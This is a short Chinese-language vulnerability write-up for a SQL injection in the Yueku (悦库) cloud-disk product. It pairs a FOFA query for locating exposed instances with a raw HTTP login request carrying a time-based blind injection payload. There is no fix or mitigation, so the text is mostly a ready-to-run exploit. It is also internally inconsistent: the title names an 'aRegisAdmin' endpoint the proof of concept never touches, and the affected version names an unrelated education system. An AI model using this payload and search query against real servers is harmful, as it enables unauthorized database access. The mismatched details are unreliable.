# 悦库网盘aRegisAdmin存在SQL注入漏洞

# 一、漏洞简介
悦库网盘系统是一款功能强大的云存储平台，提供安全可靠的文件存储、共享和管理解决方案。该系统具有灵活的存储容量、文件同步、多终端访问等特性，支持跨平台的文件分享和团队协作。悦库网盘系统采用先进的加密技术确保数据安全，并提供了用户友好的界面和多样化的权限管理功能，满足个人用户、企业团队和教育机构的不同需求。悦库网盘aRegisAdmin存在SQL注入漏洞

# 二、影响版本
+ 企慧通教育系统

# 三、资产测绘
+ fofa`<font style="color:rgb(51, 51, 51);">app=</font><font style="color:rgb(221, 17, 68);">"悦库-悦库网盘"</font>`

![1718298354037-b753585e-1dcd-4e0b-8eec-1400ed166620.png](./img/WtGy-d6GGtrILpmK/1718298354037-b753585e-1dcd-4e0b-8eec-1400ed166620-817530.png)

# 四、漏洞复现
```java
POST /user/login/.html HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; device=desktop; theme=default
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 154

account=admin') AND (SELECT 4215 FROM (SELECT(SLEEP(5)))CFVi)-- WUij&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&referer=&keepLogin=false
```

![1718298437044-3bce6637-6009-4b59-b1e6-66eb178f5df4.png](./img/WtGy-d6GGtrILpmK/1718298437044-3bce6637-6009-4b59-b1e6-66eb178f5df4-331145.png)

```java
POST /user/login/.html HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Cookie: windowWidth=1036; windowHeight=846; yid=4m6jbq6mrd5mui6ul2gr3s9fl4; lang=zh-cn; device=desktop; theme=default
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 154

account=admin&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918&clientId=5E9B11EB90214398ADA353DF7F014E9C&referer=&keepLogin=false
```

![1718298399701-682e6608-1c88-42b2-8c9e-60bfd0a3b5a3.png](./img/WtGy-d6GGtrILpmK/1718298399701-682e6608-1c88-42b2-8c9e-60bfd0a3b5a3-686633.png)



> 更新: 2024-06-17 09:34:03  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/iqb1350wkn2bu5qd>